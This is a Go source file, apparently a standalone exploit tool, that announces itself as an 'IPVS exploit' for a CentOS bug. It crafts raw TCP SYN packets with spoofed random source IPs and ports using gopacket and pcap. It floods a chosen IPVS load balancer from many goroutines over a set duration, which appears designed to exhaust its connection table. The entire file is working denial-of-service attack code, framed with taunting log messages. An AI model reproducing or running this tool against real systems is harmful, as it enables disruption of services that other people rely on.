package main

import (
	"flag"
	"log"
	"math/rand"
	"net"
	"runtime"
	"time"

	"code.google.com/p/gopacket"
	"code.google.com/p/gopacket/layers"
	"code.google.com/p/gopacket/pcap"
)

const (
	ether_default_device = "en0"
	tcp_default_port     = 80
	tcp_default_window   = 32768
	ip_default_ttl       = 64
)

type targetDesc struct {
	MAC               net.HardwareAddr
	IP                net.IP
	Port              layers.TCPPort
	connectionTimeout time.Duration
}

func constructPacket(id int, desc targetDesc) *[]byte {
	var err error

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	// Locally-administered MAC address
	srcMAC := net.HardwareAddr{0xce, 0, 0, 0, 0, 0}
	ethernetFrm := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       desc.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipVersion := uint8(4)
	ipHdrLen := uint8(5)
	ipId := uint16(rand.Int31())
	ipTTL := uint8(ip_default_ttl)
	// rfc2544 Benchmarking Methodology for Network Interconnect Devices
	ipSrc := net.IPv4(198, 18, byte(rand.Int31()), byte(rand.Int31())).To4()
	ipDst := desc.IP

	ipPkt := layers.IPv4{
		Version:  ipVersion,
		IHL:      ipHdrLen,
		Id:       ipId,
		Protocol: layers.IPProtocolTCP,
		Flags:    layers.IPv4DontFragment,
		SrcIP:    ipSrc,
		DstIP:    ipDst,
		TTL:      ipTTL,
	}

	srcPort := layers.TCPPort(uint16(rand.Int31()))
	dstPort := layers.TCPPort(desc.Port)
	window := uint16(tcp_default_window)
	seq := uint32(rand.Int31())

	tcpPkt := layers.TCP{
		SrcPort: srcPort,
		DstPort: dstPort,
		Seq:     seq,
		SYN:     true,
		Window:  window,
	}
	tcpPkt.SetNetworkLayerForChecksum(&ipPkt)

	err = gopacket.SerializeLayers(buf, opts,
		&ethernetFrm,
		&ipPkt,
		&tcpPkt)
	if err != nil {
		log.Println("[x] Failed to serialize packet:", err)
	}
	packetData := buf.Bytes()
	return &packetData
}

func sendPacket(intf *pcap.Handle, id int, desc targetDesc) {
	pkt := constructPacket(id, desc)

	for {
		if err := intf.WritePacketData(*pkt); err != nil {
			log.Println("[x] Failed to write packet:", err)
		}
		time.Sleep(desc.connectionTimeout)
	}
}

func main() {
	var err error

	log.Println("[*] Mess with the best...")
	log.Println("")
	log.Println("[*] IPVS exploit for http://bugs.centos.org/view.php?id=6752")

	ifname := flag.String("interface", ether_default_device, "interface name")
	dstMAC := flag.String("ipvs-mac", "00:00:00:00:00:00", "MAC of IPVS box (or default gateway)")
	dstIP := flag.String("ipvs-ip", "0.0.0.0", "IP address of IPVS box")
	dstPort := flag.Int("ipvs-port", tcp_default_port, "Port of IPVS box")
	timeout := flag.Duration("ipvs-timeout", 60*time.Second, "IPVS connection timeout")
	connections := flag.Int("connections", 1, "number of simultanious connections")
	duration := flag.Duration("duration", 1*time.Hour, "test duration")
	ncpu := flag.Int("ncpu", -1, "number of go threads")
	flag.Parse()

	log.Println("")
	log.Println("[*] Interface:", *ifname)
	log.Println("[*] MAC:", *dstMAC)
	log.Println("[*] IP:", *dstIP)
	log.Println("[*] Port:", *dstPort)
	log.Println("[*] Connections:", *connections)
	log.Println("[*] Timeout:", *timeout)
	log.Println("[*] Duration:", *duration)
	log.Println("[*] N*CPU:", *ncpu)
	log.Println("")

	if *ncpu != -1 {
		if *ncpu == 0 {
			runtime.GOMAXPROCS(runtime.NumCPU())
		} else {
			runtime.GOMAXPROCS(*ncpu)
		}
	}

	var ip net.IP
	if ip = net.ParseIP(*dstIP).To4(); ip == nil {
		log.Fatal("[x] Can't decode IP", dstIP)
	}

	var mac net.HardwareAddr
	if mac, err = net.ParseMAC(*dstMAC); err != nil {
		log.Fatal("[x] Can't decode MAC", dstMAC)
	}

	var port = layers.TCPPort(*dstPort)

	desc := targetDesc{
		MAC:               mac,
		IP:                ip,
		Port:              port,
		connectionTimeout: *timeout,
	}

	log.Println("[>] Opening", *ifname, "device")
	if intf, err := pcap.OpenLive(*ifname, 1600, true, 0); err != nil {
		log.Fatal("[x] OpenLive failed:", err)
	} else {
		log.Println("[>] Spawning", *connections, "goroutine(s)")

		for i := 0; i < *connections; i++ {
			go sendPacket(intf, i, desc)
		}

		log.Println("[>] Sleeping for:", *duration)
		time.Sleep(*duration)
	}

	log.Println("")
	log.Println("[*] ... die like a rest.")
}
